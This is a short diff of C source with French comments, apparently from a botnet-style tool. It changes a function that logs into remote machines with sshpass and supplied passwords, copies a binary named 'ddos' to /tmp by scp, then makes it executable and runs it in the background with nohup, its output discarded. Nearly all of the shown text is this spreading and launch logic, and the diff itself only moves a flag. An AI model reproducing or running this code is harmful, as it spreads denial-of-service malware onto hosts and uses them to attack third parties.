@@ -144,9 +144,6 @@ void transfer() {
                 snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
                 printf("La commande créée est : %s\n", scp_command); // show the curent command
                 system(scp_command);
-                
-                // Marqued if chmod as already be executed
-                chmod_executed = 1;
             }
             
             // SSH connection to the user on the specified IP
@@ -157,6 +154,7 @@ void transfer() {
             } else {
                 // if chmod not executed = execute with chmod
                 snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
+                chmod_executed = 1;
             }
 
             printf("La commande créée est : %s\n", ssh_command); // show current command
